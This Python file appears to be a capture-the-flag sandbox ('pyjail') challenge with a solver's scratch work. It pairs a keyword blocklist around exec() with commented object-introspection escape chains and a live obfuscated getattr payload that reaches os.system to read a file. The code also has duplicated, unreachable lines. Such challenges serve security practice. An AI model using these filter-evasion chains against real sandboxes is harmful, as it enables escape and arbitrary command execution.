def main():
    print(open(__file__).read())
    print()
    print()
    print()
    print("I dare you to break me")
    # print(globals())
    # print(locals())
    text = input('>>> ')
    # text = "getattr(getattr(getattr((lambda: 0), chr(95)+chr(95)+'glo'+'bals'+chr(95)+chr(95))[chr(95)+chr(95)+'built'+'ins'+chr(95)+chr(95)], chr(95)+chr(95)+'im'+'port'+chr(95)+chr(95))('o'+'s'), 'sys'+'tem')('cat file.txt')"

    for keyword in ['builtins', 'dir', 'name', 'class', 'base', 'mro', 'globals', 'subprocess', 'eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', '_']:
        if keyword in text.lower():
            print("Noob!")
            return;
    
    exec(text)
            return
    exec(text)


if __name__ == "__main__":
    main()
    # print(__builtins__.__dict__)
    # x = (lambda: 0).__class__.__base__.__subclasses__()[
    # 59]()._module.__builtins__
    # x= getattr(getattr(getattr(getattr(lambda: 0, '__class__'),
    # '__base__'), '__subclasses__')()[59]()._module, '__builtins__')
    # print(getattr(getattr(getattr(getattr((lambda: 0), '__class__'),
    #   '__base__'), '__subclasses__')()[59]()._module, '__builtins__'))
    # subclasses = getattr(
    #     getattr(getattr((lambda: 0), '__class__'), '__base__'), '__subclasses__')()
    # for subclass in subclasses:
    #     try:
    #         instance = subclass()
    #         x = getattr(instance._module, '__builtins__')
    #         break
    #     except TypeError:
    #         continue
    # x = (lambda: 0).__class__.__base__.__subclasses__()

    # Find the index of the 'builtins' module
    # index = next(i for i, cls in enumerate(x) if cls.__name__ == 'module')

    # Access the 'builtins' module
    # # builtins_module = x[index]()._module.__builtins__
    # x = (lambda: 0).__class__.__base__.__subclasses__()

    # # Find the index of the 'builtins' module
    # index = next(i for i, cls in enumerate(x) if cls.__name__ == 'module')

    # # Access the 'builtins' module
    # builtins_module = x[index].__dict__['__builtins__']

    # # Now you can use the built-in functions
    # print(builtins_module)

    # Now you can use the built-in functions
    # def foo():
    #     pass

    # builtins_module = foo.__class__.__base__.__subclasses__().find(<class 'module'>).__dict__['__builtins__']
    # print(builtins_module)
    # def foo():
    # pass

    # Get the list of subclasses
    # subclasses = foo.__class__.__base__.__subclasses__()

    # Find the index of the 'module' class
    # index = next(i for i, cls in enumerate(
    # subclasses) if cls.__name__ == 'moduledef')

    # Access the 'builtins' module
    # builtins_module = subclasses[index].__builtins__
    # print(builtins_module)

    # Get the global namespace
    getattr(getattr(getattr((lambda: 0), chr(95)+chr(95)+'glo'+'bals'+chr(95)+chr(95))[chr(95)+chr(95)+'built'+'ins'+chr(
        95)+chr(95)], chr(95)+chr(95)+'im'+'port'+chr(95)+chr(95))('o'+'s'), 'sys'+'tem')('cat file.txt')

    # Now you can use the global namespace
    # print(globals_dict)
